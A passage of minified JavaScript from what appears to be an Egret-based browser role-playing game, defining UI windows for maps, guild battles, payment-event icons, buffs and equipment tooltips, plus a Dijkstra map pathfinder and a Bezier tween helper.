f=h.GameLogic.ins().kfCost,g=i[this.type].bossId,m=l.GlobalConfig.MonstersConfig[g].crusade;f>=m&&(this.isUse=!0),this.tools.textFlow=f>0?s.TextFlowMaker.generateTextFlow1("|C:"+n.ColorUtil.GREEN_COLOR_N+"&T:"+f+"|/"+m):s.TextFlowMaker.generateTextFlow1("|C:"+n.ColorUtil.RED_COLOR_N+"&T:0|/"+m),this.counts.textFlow=p.SixReisCT.ins().hadHelpCount>0?s.TextFlowMaker.generateTextFlow1("|C:"+n.ColorUtil.GREEN_COLOR_N+"&T:"+(p.SixReisCT.ins().hadHelpCount||0)+"|"):s.TextFlowMaker.generateTextFlow1("|C:"+n.ColorUtil.RED_COLOR_N+"&T:0|")}},e.prototype.clearMapItem=function(){if(this.contentGrop.numElements>0)for(var t=this.contentGrop.numElements-1;t>=0;t--){var e=this.contentGrop.getElementAt(t);e&&e.clearAll(),o.DisplayUtils.removeFromParent(e)}},e.prototype.getGo=function(){var t=this;return this.isUse?void p.SixReisCT.ins().postChangeSixPos(this.id):void u.WarnWin.show(gettext("当前讨伐令不足，击杀将不获得击杀收益，是否确认进入？"),function(){p.SixReisCT.ins().postChangeSixPos(t.id)},this)},e.prototype.getHelp=function(){var t=l.GlobalConfig.HelpInfoConfig[328];win.open("CommonHelpWin",(null===t||void 0===t?void 0:t.text)||"")},__decorate([delayCall(100)],e.prototype,"setMapShowOrHide",null),e}(a.BaseView);e.SixreincarnationsMapWin=c,window.SixreincarnationsMapWin=c,__reflect(c.prototype,"SixreincarnationsMapWin",[]),window.SixreincarnationsMapWin=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.View_GongLue=void 0;var n=i(16),o=i(1),s=i(0),a=i(234),r=i(446),l=i(447),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="WalkthroughSkin",e.gonglueText=new a.GongLueText,e}return __extends(e,t),e.prototype.skinComplete=function(){this.tabBar.itemRenderer=r.Item_GongLue,this.eTab.itemRenderer=l.Item_GongLue2,this.addEvent(egret.TouchEvent.TOUCH_TAP,this.closeBtn,this.close);var t=[];for(var e in s.GlobalConfig.HelpConfig)t.push(s.GlobalConfig.HelpConfig[e]);this.tabBar.dataProvider=this.arc=new eui.ArrayCollection(t),this.tabBar.addEventListener(eui.UIEvent.CHANGE,this.CHANGE,this),this.eTab.dataProvider=this.arc2=new eui.ArrayCollection,this.eTab.addEventListener(eui.UIEvent.CHANGE,this.CHANGE2,this),this.tabBar.selectedIndex=0,this.updateTab2(),this.eTab.selectedIndex=0,this.updateContent(),n.DisplayUtils.removeFromParent(this.lb),this.scrollerGroup.addChild(this.gonglueText),this.gonglueText.textWidth=this.scrollerGroup.width},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e]},e.prototype.CHANGE=function(t){this.updateTab2(),this.updateContent()},e.prototype.CHANGE2=function(t){this.updateContent()},e.prototype.updateTab2=function(){var t=s.GlobalConfig.HelpConfig[this.tabBar.selectedIndex+1],e=[];for(var i in t)e.push(t[i]);this.arc2.replaceAll(e)},e.prototype.updateContent=function(){var t=s.GlobalConfig.HelpConfig[this.tabBar.selectedIndex+1][this.eTab.selectedIndex+1];this.gonglueText.richText=s.GlobalConfig.HelpInfoConfig[t.text].text,this.scroller.stopAnimation(),this.scroller.viewport.scrollV=0},e.prototype.close=function(){win.close(this)},e}(o.BaseView);e.View_GongLue=h,window.View_GongLue=h,__reflect(h.prototype,"View_GongLue",[]),window.View_GongLue=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MainMapInfoItem=void 0;var n=i(3),o=i(0),s=i(4),a=i(20),r=i(32),l=i(79),h=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){var t;if(this.data){this.grp.visible=!0,this.selectImg.visible=1==this.data;var e=void 0;if(1==this.data)e=o.GlobalConfig.InstanceConfig[a.GameMap.fubenID],this.gobtn.label=(null===e||void 0===e?void 0:e.name)||"";else if(this.data>1)if(a.GameMap.fbType==r.FbCT.FB_TYPE_LIU_DAO_LUN_HUI){var i=(Math.floor(this.data/1e3),this.data%100,l.SixReisCT.ins().returnMapData(this.data)),n=0,h=0,u=0;if(i&&(n=i.type,h=i.layer,u=i.state),n){var p=null===(t=o.GlobalConfig.SixUndergroundPalacesTypeConfig[n])||void 0===t?void 0:t.fbId;e=o.GlobalConfig.InstanceConfig[p]}3==u?this.gobtn.label.includes("？"):this.gobtn.label=(null===e||void 0===e?void 0:e.name)||""}else e=o.GlobalConfig.InstanceConfig[this.data],this.gobtn.label=(null===e||void 0===e?void 0:e.name)||"";e&&e.powerlimit>s.ActorCC.power?(this.lb_power.text=String(e.powerlimit),this.lock.visible=!0):(this.lb_power.text="",this.lock.visible=!1)}else this.grp.visible=!1},e}(n.BaseItemRender);e.MainMapInfoItem=h,window.MainMapInfoItem=h,__reflect(h.prototype,"MainMapInfoItem",[]),window.MainMapInfo=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MapSearch=void 0;var n=i(1076),o=i(0),s=i(32),a=function(){function t(){this.initMap()}return t.getins=function(){return t.ins||(t.ins=new t),t.ins},t.prototype.initMap=function(){this.mapIdArr=[],this.mapWeight=[];var t=0;for(var e in o.GlobalConfig.InstanceConfig){var i=o.GlobalConfig.InstanceConfig[e];(1==i.type||2==i.type||i.type==s.FbCT.FB_TYPE_GUILD_WAR||i.type==s.FbCT.FB_TYPE_SHI_KONG_ZHI_JING)&&(this.mapIdArr.push(i.fbid),this.mapWeight[t++]=[])}for(var t=0,a=this.mapIdArr.length;a>t;t++)for(var r=this.mapIdArr[t],l=o.GlobalConfig.InstanceConfig[r].otherFb,h=0,u=this.mapIdArr.length;u>h;h++){var p=l.indexOf(this.mapIdArr[h]);t==h?this.mapWeight[t][h]=0:-1!=p?this.mapWeight[t][h]=1:this.mapWeight[t][h]=n.Dijkstra.M}},t.prototype.search=function(t,e){for(var i=this.mapIdArr.indexOf(t),o=this.mapIdArr.indexOf(e),s=n.Dijkstra.dijkstra(this.mapWeight,i,o)||[],a=[],r=0,l=s;r<l.length;r++){var h=l[r];a.push(this.mapIdArr[h])}return a},t}();e.MapSearch=a,window.MapSearch=a,__reflect(a.prototype,"MapSearch",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Bezier=void 0;var n=function(){function t(t,e){this._fromPoint=t,this._toPoint=e}return t.pop=function(e,i){var n=null;return this._pool.length?(n=this._pool.pop(),n.fromPoint=e,n.toPoint=i):n=new t(e,i),n},t.push=function(t){t&&(t.display=null,t.ease=null,t.fromPoint=null,t.toPoint=null,t.centerPoint=null,this._pool.push(t))},Object.defineProperty(t.prototype,"fromPoint",{set:function(t){this._fromPoint=t},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"toPoint",{set:function(t){this._toPoint=t},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"display",{set:function(t){this._display=t},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"ease",{set:function(t){this._ease=t},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"centerPoint",{set:function(t){this._centerPoint=t},enumerable:!1,configurable:!0}),t.prototype.start=function(t,e,i,n){var o=this;void 0===n&&(n=0),egret.Tween.get(this).wait(n).to({factor:1},t,this._ease).call(function(){egret.Tween.removeTweens(o),e&&e.call(i)})},Object.defineProperty(t.prototype,"factor",{get:function(){return 0},set:function(t){this._display.x=(1-t)*(1-t)*this._fromPoint.x+2*t*(1-t)*this._centerPoint.x+t*t*this._toPoint.x,this._display.y=(1-t)*(1-t)*this._fromPoint.y+2*t*(1-t)*this._centerPoint.y+t*t*this._toPoint.y},enumerable:!1,configurable:!0}),t._pool=[],t}();e.Bezier=n,window.Bezier=n,__reflect(n.prototype,"Bezier",[]),window.Bezier=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildBattleItem4=void 0;var n=i(3),o=i(0),s=i(4),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="GuildBattleItem4Skin",e}return __extends(e,t),e.prototype.skinComplete=function(){var t;this._oldColor=(null===(t=this.txtScore)||void 0===t?void 0:t.textColor)||16767413,this.dataChanged()},e.prototype.dataChanged=function(){var t;if(this._info=this.data,this.skin&&this._info){if(0==this._info.cardId)this.txtPos.text=gettext("已离开");else{var e=o.GlobalConfig.GuildBattleLevel[this._info.cardId];this.txtPos.text=null===e||void 0===e?void 0:e.name}this.txtName.text=this._info.name,this.txtScore.text=(null===(t=this._info)||void 0===t?void 0:t.point)+"",this._info.roleId==s.ActorCC.actorID?this.txtName.textColor=this.txtPos.textColor=this.txtScore.textColor=4587386:this.txtName.textColor=this.txtScore.textColor=this.txtPos.textColor=this._oldColor}},e}(n.BaseItemRender);e.GuildBattleItem4=a,window.GuildBattleItem4=a,__reflect(a.prototype,"GuildBattleItem4",[]),window.GuildBattleItem4=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildBattleItem5=void 0;var n=i(3),o=i(28),s=function(t){function e(){var e=t.call(this)||this;return e._sn_="GuildBattleItem5Skin",e}return __extends(e,t),e.prototype.skinComplete=function(){var t;this._oldColor=(null===(t=this.txtScore)||void 0===t?void 0:t.textColor)||16777215,this.dataChanged()},e.prototype.dataChanged=function(){if(this._info=this.data,this.skin&&this._info){var t=this.itemIndex+1;4>t?(this.txtRank.visible=!1,this.imgRank.visible=!0,this.imgRank.source="paihang_d"+t):(this.txtRank.visible=!0,this.imgRank.visible=!1,this.txtRank.text=gettext("第{0}名",t)),this.txtGuildName.text=this._info.guildName,this.txtScore.text=this._info.guildPoint+"",o.Guild.ins().guildID==this._info.id?this.txtRank.textColor=this.txtGuildName.textColor=this.txtScore.textColor=4587386:this.txtRank.textColor=this.txtGuildName.textColor=this.txtScore.textColor=this._oldColor}},e}(n.BaseItemRender);e.GuildBattleItem5=s,window.GuildBattleItem5=s,__reflect(s.prototype,"GuildBattleItem5",[]),window.GuildBattleItem5=s
},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PayfunArraColler=void 0;var n=i(64),o=i(464),s=function(t){function e(e,i){var o=t.call(this,i)||this;return o.post=e,o.recSverNotify(o.onChange,n.MainUICC.postPayfunChange),o}return __extends(e,t),e.prototype.onChange=function(t){t.cfg.pos==this.post&&(this.source.indexOf(t)>-1||this.addItem(t))},e.prototype.recSverNotify=function(t,e){observe(this,t,e)},e}(o.ArrayColler);e.PayfunArraColler=s,window.PayfunArraColler=s,__reflect(s.prototype,"PayfunArraColler",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ArrayColler=void 0;var n=i(220),o=function(t){function e(e){var i=t.call(this,e)||this;return Object.defineProperty(i,"source",{get:function(){return i._source},set:function(t){i.removeEvnt(),t||(t=[]),i._source=t,i.dispatchCoEvent(eui.CollectionEventKind.RESET),i.addEvent()}}),i.addEvent(),i}return __extends(e,t),e.prototype.addItem=function(e){t.prototype.addItem.call(this,e),e.addEventListener(n.EventType["delete"],this.onDelte,this),e.addEventListener(n.EventType.CHANGE,this.refresh,this),this.refresh()},e.prototype.onDelte=function(t){var e=t.target,i=this.getItemIndex(e);i>=0&&(this.removeItemAt(i),e.removeEventListener(n.EventType["delete"],this.onDelte,this),e.removeEventListener(n.EventType.CHANGE,this.refresh,this),this.refresh())},e.prototype.removeAll=function(){this.removeEvnt(),t.prototype.removeAll.call(this)},e.prototype.removeEvnt=function(){for(var t=this.source.length,e=0;t>e;e++){var i=this.source[e];i.removeEventListener(n.EventType["delete"],this.onDelte,this),i.removeEventListener(n.EventType.CHANGE,this.refresh,this)}},e.prototype.addEvent=function(){for(var t=this.source.length,e=0;t>e;e++){var i=this.source[e];i.addEventListener(n.EventType["delete"],this.onDelte,this),i.addEventListener(n.EventType.CHANGE,this.refresh,this)}},e}(eui.ArrayCollection);e.ArrayColler=o,window.ArrayColler=o,__reflect(o.prototype,"ArrayColler",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PayfunIcon=void 0;var n=i(8),o=i(3),s=i(7),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="PayfunIconSkin",e.addTouchEndEvent(e,e.onTap),e}return __extends(e,t),e.prototype.removeDisplay=function(){Timer.stop(this.timeHandler,this)},e.prototype.dataChanged=function(){var t=this.data;if(this._info=t,this.btn&&this.data)if(this.btn.icon=RES_DIR_payicon+t.cfg.icon+".png",this.btn.red.visible=!!this.data.redPoint,void 0==this._info.descType)this.timeTxt.visible=!1;else if(this.timeTxt.visible=!0,"string"==typeof this._info.descType)this.timeTxt.text=this._info.descType;else if("number"==typeof this._info.descType){var e=s.GameServerCC.serverTime;e>=this._info.descType?(Timer.stop(this.timeHandler,this),this.timeTxt.visible=!1):(this.timeHandler(),Timer.has(this.timeHandler,this)||Timer.start(1e3,0,this.timeHandler,this))}else this.timeTxt.visible=!1},e.prototype.timeHandler=function(){var t=s.GameServerCC.serverTime;t>=+this._info.descType?(console.warn("活动结束了"),Timer.stop(this.timeHandler,this),this.timeTxt.visible=!1):void 0!=this._info.descStyle&&""!=this._info.descStyle?this.timeTxt.text=gettext(this._info.descStyle,n.DateUtils.getFormatBySecond(Math.floor(.001*(+this._info.descType-t)),n.DateUtils.TIME_FORMAT_3)):this._info.isZh?this.timeTxt.text=n.DateUtils.getFormatBySecond(Math.floor(.001*(+this._info.descType-t)),n.DateUtils.TIME_FORMAT_10):this.timeTxt.text=n.DateUtils.getFormatBySecond(Math.floor(.001*(+this._info.descType-t)),n.DateUtils.TIME_FORMAT_3)},e.prototype.onTap=function(t){var e=this.data;e&&e.tapEvt()},e}(o.BaseItemRender);e.PayfunIcon=a,window.PayfunIcon=a,__reflect(a.prototype,"PayfunIcon",[]),window.Playericon=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BurningDesertFightView=void 0;var n=i(5),o=i(1),s=i(0),a=i(75),r=function(t){function e(){var e=t.call(this)||this;return e._sn_="BurningDesertFightSkin",e._isShow=!0,e._maxLeft=0,e._speedX=1e3/(e._maxLeft- -200),e}return __extends(e,t),e.prototype.skinComplete=function(){this.flusInfo()},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(a.BurningDesertCT.ins().sceneBuffInfoBack,this.flusInfo),this.observe(a.BurningDesertCT.ins().postShowFightWin,this.showFinghtWin),this.flusInfo(),this.addEvent(egret.TouchEvent.TOUCH_TAP,this.arrow,this.onClickHandler),this._isShow=!0,this.flusShowStatus()},e.prototype.showFinghtWin=function(){this._isShow=!0,this.flusShowStatus()},e.prototype.onClickHandler=function(t){this._isShow=!this._isShow,this.flusShowStatus()},e.prototype.flusShowStatus=function(){var t=this.boxFight.left,e=0;this._isShow?(e=Math.floor((this._maxLeft-t)/this._speedX),egret.Tween.get(this.boxFight).to({left:this._maxLeft},e)):(e=Math.floor((t- -this.imgBg.width)/this._speedX),egret.Tween.get(this.boxFight).to({left:-this.imgBg.width},e))},e.prototype.flusInfo=function(){if(this.skin){var t="",e=a.BurningDesertCT.ins().monsterBuffArr;if(e&&e.length>0)for(var i=0,o=e.length;o>i;i++){var r=s.GlobalConfig.HotDesertBuffConfig[e[i]];t+=""==t?r.desc:"\n"+r.desc}if(e=a.BurningDesertCT.ins().playerBuffArr,e&&e.length>0)for(var i=0,o=e.length;o>i;i++){var r=s.GlobalConfig.HotDesertBuffConfig[e[i]];t+=""==t?r.desc:"\n"+r.desc}this.txtAttrDesc.textFlow=n.TextFlowMaker.generateTextFlow(t)}},e.prototype.removeDisplay=function(){},e}(o.BaseView);e.BurningDesertFightView=r,window.BurningDesertFightView=r,__reflect(r.prototype,"BurningDesertFightView",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ShiKongZhiJingFbReliveWin=void 0;var n=i(8),o=i(1),s=i(0),a=i(20),r=i(7),l=i(75),h=function(t){function e(){var e=t.call(this)||this;return e._sn_="ShiKongZhiJingFbGrp",e}return __extends(e,t),e.prototype.skinComplete=function(){this.flusInfo(this._reliveTime)},e.prototype.flusInfo=function(t){var e,i;if(this._reliveTime=t,this.skin){var o=l.BurningDesertCT.ins().getBoosIdByFbid(a.GameMap.fubenID),h=s.GlobalConfig.MonstersConfig[o];if(this.bossName.text=null===h||void 0===h?void 0:h.name,!this._reliveTime||this._reliveTime<=0||void 0==this._reliveTime)Timer.stop(this.flusTimeFun,this),null===(e=this.parent)||void 0===e?void 0:e.removeChild(this);else{var u=r.GameServerCC.serverTime,p=n.DateUtils.formatMiniDateTime(this._reliveTime);u>=p?(Timer.stop(this.flusTimeFun,this),null===(i=this.parent)||void 0===i?void 0:i.removeChild(this)):(this.rebornTime.text=n.DateUtils.getFormatBySecond(Math.ceil(.001*(p-u))),this.flusTimeFun(),Timer.has(this.flusTimeFun,this)||Timer.start(1e3,0,this.flusTimeFun,this))}}},e.prototype.flusTimeFun=function(){var t,e=n.DateUtils.formatMiniDateTime(this._reliveTime),i=e-r.GameServerCC.serverTime;i>0?this.rebornTime.text=n.DateUtils.getFormatBySecond(Math.ceil(.001*i)):(null===(t=this.parent)||void 0===t?void 0:t.removeChild(this),Timer.stop(this.flusTimeFun,this))},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e]},e.prototype.removeDisplay=function(){},e}(o.BaseView);e.ShiKongZhiJingFbReliveWin=h,window.ShiKongZhiJingFbReliveWin=h,__reflect(h.prototype,"ShiKongZhiJingFbReliveWin",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SixBuffWin=void 0;var n=i(8),o=i(1),s=i(0),a=i(7),r=i(79),l=function(t){function e(){var e=t.call(this)||this;return e._sn_="SixTrialsBuffTips",e._isShow=!0,e._maxLeft=0,e._speedX=1e3/(e._maxLeft- -200),e.t=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.txtcd.text="",this.addDisplay()},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.arrow,this.onClickHandler),observe(this,this.updateData,r.SixReisCT.ins().updateMap),this._isShow=!0,this.flusShowStatus(),Timer.stop(this.timeFun,this),this.updateData()},e.prototype.removeDisplay=function(){this.removeTouchEvent(this.arrow,this.onClickHandler),Timer.stopAll(this),this.removeObserve()},e.prototype.Open=function(){!this.skin},e.prototype.onClickHandler=function(t){this._isShow=!this._isShow,this.flusShowStatus()},e.prototype.flusShowStatus=function(){var t=this.sixFight.left,e=0;this._isShow?(e=Math.floor((this._maxLeft-t)/this._speedX),egret.Tween.get(this.sixFight).to({left:this._maxLeft},e)):(e=Math.floor((t- -this.imgBg.width)/this._speedX),egret.Tween.get(this.sixFight).to({left:-this.imgBg.width},e))},e.prototype.updateData=function(){var t=s.GlobalConfig.SixUndergroundPalacesTypeConfig,e=r.SixReisCT.ins().returnMapData(r.SixReisCT.ins().pos);if(!e||void 0==e)return void Timer.stop(this.timeFun,this);var i=t[e.type].buffDesc,o=!0;if(i&&void 0!=i){var l=r.SixReisCT.ins().returnBuffIdx(r.SixReisCT.ins().pos);0==l?this.txtAttrDesc.text="无":this.txtAttrDesc.text=i[r.SixReisCT.ins().returnBuffIdx(r.SixReisCT.ins().pos)-1]}else o=!1,this.txtAttrDesc.text=gettext("无");if(this.txtstate.visible=r.SixReisCT.ins().isPosUnlock(r.SixReisCT.ins().pos)&&o,this.t=(null===e||void 0===e?void 0:e.time)||0,this.t){if(this.grpCd.visible=!0,this.grpLive.visible=!1,!((n.DateUtils.formatMiniDateTime(this.t)-a.GameServerCC.serverTime)/1e3<=0)){var h=(n.DateUtils.formatMiniDateTime(this.t)-a.GameServerCC.serverTime)/1e3;this.txtcd.text=n.DateUtils.getFormatBySecond(h,n.DateUtils.TIME_FORMAT_1)}Timer.start(1e3,0,this.timeFun,this)}},e.prototype.timeFun=function(){var t=(n.DateUtils.formatMiniDateTime(this.t)-a.GameServerCC.serverTime)/1e3;return 0>=t?(this.txtcd.text="",this.grpCd.visible=!1,this.grpLive.visible=!0,void Timer.stop(this.timeFun,this)):void(this.txtcd.text=n.DateUtils.getFormatBySecond(t,n.DateUtils.TIME_FORMAT_1))},e}(o.BaseView);e.SixBuffWin=l,window.SixBuffWin=l,__reflect(l.prototype,"SixBuffWin",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.StardomainFightView=void 0;var n=i(5),o=i(1),s=i(22),a=i(0),r=i(58),l=i(83),h=function(t){function e(){var e=t.call(this)||this;return e._sn_="BurningDesertFightSkin",e._isShow=!0,e._maxLeft=0,e._speedX=1e3/(e._maxLeft- -200),e}return __extends(e,t),e.prototype.skinComplete=function(){this.flusInfo()},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(l.StardomainCT.ins().sceneBuffInfoBack,this.flusInfo),this.observe(l.StardomainCT.ins().postShowFightWin,this.showFinghtWin),this.flusInfo(),this.addEvent(egret.TouchEvent.TOUCH_TAP,this.arrow,this.onClickHandler),this._isShow=!0,this.flusShowStatus()},e.prototype.showFinghtWin=function(){this._isShow=!0,this.flusShowStatus()},e.prototype.onClickHandler=function(t){this._isShow=!this._isShow,this.flusShowStatus()},e.prototype.flusShowStatus=function(){var t=this.boxFight.left,e=0;this._isShow?(e=Math.floor((this._maxLeft-t)/this._speedX),egret.Tween.get(this.boxFight).to({left:this._maxLeft},e)):(e=Math.floor((t- -this.imgBg.width)/this._speedX),egret.Tween.get(this.boxFight).to({left:-this.imgBg.width},e))},e.prototype.flusInfo=function(){var t;if(this.skin){var e="";if(l.StardomainCT.ins().sceneBuff){var i=a.GlobalConfig.StarDomainBuffConfig[l.StardomainCT.ins().sceneBuff.buffId],o=a.GlobalConfig.EffectsConfig[null===i||void 0===i?void 0:i.buffId];if(i&&o){var h=Math.abs(Math.floor(1e-4*l.StardomainCT.ins().sceneBuff.value)),u=s.AttributeData.getAttrValStrByType(null===(t=o.args)||void 0===t?void 0:t.d,h);e=r.LangUtils.formatStr(i.desc,[u])}}this.txtAttrDesc.textFlow=n.TextFlowMaker.generateTextFlow(e)}},e.prototype.removeDisplay=function(){l.StardomainCT.ins().sceneBuff=null},e}(o.BaseView);e.StardomainFightView=h,window.StardomainFightView=h,__reflect(h.prototype,"StardomainFightView",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RogueSkillListWin=void 0;var n=i(1),o=i(0),s=i(471),a=i(143),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="rougebuffSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){var t=a.RogueCT.ins().nowHasSelectCard,e=[],i=o.GlobalConfig.OpenGameType1_1Cfg;for(var n in t){var r=!1;for(var l in e){var h=i[e[l]],u=i[t[n]];h.group==u.group&&1==h.addType&&(r=!0,h.quality<u.quality&&(e[l]=t[n]))}r||e.push(t[n])}this.eList.itemRenderer=s.RogueSkillItem,this.eList.dataProvider=this.listAc=new eui.ArrayCollection(e)},e}(n.BaseView);e.RogueSkillListWin=r,window.RogueSkillListWin=r,__reflect(r.prototype,"RogueSkillListWin",[]),window.RogueSkillListWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RogueSkillItem=void 0;var n=i(5),o=i(3),s=i(0),a=i(31),r=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){var t=s.GlobalConfig.OpenGameType1_1Cfg[this.data];t&&(this.eName.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("|C:{0}&T:{1}|",a.QUALITY_COLOR[t.quality],t.title)),this.eDesc.textFlow=n.TextFlowMaker.generateTextFlow1(t.desc||""))},e}(o.BaseItemRender);e.RogueSkillItem=r,window.RogueSkillItem=r,__reflect(r.prototype,"RogueSkillItem",[]),window.RogueSkillItem=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MasterEquipSuitTips=void 0;var n=i(1),o=i(21),s=i(0),a=i(5),r=i(31),l=i(118),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="heartmethodSkillTipSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.roleId=0,this.skillMc=new o.MovieClip,this.updateUI()},e.prototype.updateUI=function(){var t,e=l.MasterEquipCT.ins().getSuitLevel(),i=s.GlobalConfig.MasterSuitEquipSuitConfig,n=Object.keys(i).length;e?e>=n?(this.currentState="max",t=i[n]):(this.currentState="normal",t=i[e]):(this.currentState="initial",t=i[1]),this.validateNow();var o=s.GlobalConfig.SkillsConfig[t.passiveSkillId],h=s.GlobalConfig.SkillsDescConfig[o.desc];this.skillName.text=h.name,this.skill.addChild(this.skillMc),this.skillMc.x=250,this.skillMc.y=270,this.skillMc.playFile(RES_DIR_EFF+t.demo,-1);var u=r.QUALITY_COLOR[t.level];this.curskillDesc0.textFlow=a.TextFlowMaker.generateTextFlow1("|C:"+u+"&T:【"+h.name+"】");var p="",d=l.MasterEquipCT.ins().getSuitCount(this.roleId,t.level);if(p=gettext("{0}级主宰副装  ",t.level)+("("+d+"/"+l.MasterEquipEnum.MasterEquipMaxSlot+")"),"initial"==this.currentState)this.equipName.text=p,this.curskillDesc3.textFlow=a.TextFlowMaker.generateTextFlow1(h.desc);else if("normal"==this.currentState){var c=i[e+1];this.curskillDesc3.textFlow=a.TextFlowMaker.generateTextFlow1(h.desc),d=l.MasterEquipCT.ins().getSuitCount(this.roleId,c.level),p=gettext("{0}级主宰副装  ",e+1)+("("+d+"/"+l.MasterEquipEnum.MasterEquipMaxSlot+")"),u=r.QUALITY_COLOR[c.level];var f=s.GlobalConfig.SkillsConfig[c.passiveSkillId],g=s.GlobalConfig.SkillsDescConfig[f.desc];this.nextskillTitle0.textFlow=a.TextFlowMaker.generateTextFlow1("|C:"+u+"&T:【"+h.name+"】"),this.nextskillTitle2.text=p,this.nextskillTitle3.textFlow=a.TextFlowMaker.generateTextFlow1(g.desc)}else"max"==this.currentState&&(this.nextskillTitle0.textFlow=a.TextFlowMaker.generateTextFlow1("|C:"+u+"&T:【"+h.name+"】"),this.nextskillTitle3.textFlow=a.TextFlowMaker.generateTextFlow1(h.desc))},e}(n.BaseView);e.MasterEquipSuitTips=h,window.MasterEquipSuitTips=h,__reflect(h.prototype,"MasterEquipSuitTips",[]),window.MasterEquipSuitTips=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MasterEquipWarnFrameWin=void 0;var n=i(1),o=i(11),s=i(0),a=i(118),r=function(t){function e(){var e=t.call(this)||this;return e._sn_="MasterequipwarnFrameSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.itemList.itemRenderer=o.ItemBase,this.itemList.dataProvider=this.itemArr=new eui.ArrayCollection,this.addTouchEvent(this.sureBtn,this.onClick),this.addTouchEvent(this.notBtn,this.onClick)},e.prototype.onClick=function(t){switch(t.target){case this.sureBtn:a.MasterEquipCT.ins().sendMasterEquipDeCompose([this.itemData.handle]),win.close(this);break;case this.notBtn:win.close(this)}},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.itemData=t[0];var i=s.GlobalConfig.MasterSuitEquipConfig[this.itemData.configID];i&&this.itemArr.replaceAll(i.decompose)},e.prototype.removeDisplay=function(){this.skin&&this.removeObserve()},e}(n.BaseView);e.MasterEquipWarnFrameWin=r,window.MasterEquipWarnFrameWin=r,__reflect(r.prototype,"MasterEquipWarnFrameWin",[]),window.MasterEquipWarnFrameWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MasterEquipChangeWin=void 0;var n=i(1),o=i(0),s=i(10),a=i(118),r=i(260),l=i(1085),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="MasterEquipChangeSkin",e.curPos=0,e.skilliconArr=[],e}return __extends(e,t),e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return!0},e.prototype.skinComplete=function(){this.list.itemRenderer=l.MasterEquipChangeItem,this.list.dataProvider=this.arc=new eui.ArrayCollection([]),this.eTab.addEventListener(eui.UIEvent.CHANGE,this.onTabChange,this);for(var t=1;6>=t;t++){var e=this["skillicon"+t];this.skilliconArr.push(e),this.addTouchEvent(e,this.onSkillClick)}for(var i=[],t=0;t<a.MasterEquipEnum.MasterEquipMaxSlot;t++)i.push(s.ItemUtil.getMasterPosName(t));this.eTab.dataProvider=new eui.ArrayCollection(i),this.eTab.selectedIndex=0},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=t[0],n=o.GlobalConfig.ItemConfig[i];this.curPos=s.ItemUtil.getSubType(n),this.eTab.selectedIndex=this.curPos,this.updateView()},e.prototype.onTabChange=function(){this.curPos=this.eTab.selectedIndex,this.updateView()},e.prototype.onSkillClick=function(t){var e=Number(t.target.name);e&&win.open(r.MasterEquipTips,e)},e.prototype.updateView=function(){var t=[],e=o.GlobalConfig.MasterSuitEquipConfig;for(var i in e){var n=e[i],r=o.GlobalConfig.ItemConfig[n.id],l=s.ItemUtil.getSubType(r);l==this.curPos&&t.push(n)}this.arc.source=t;for(var 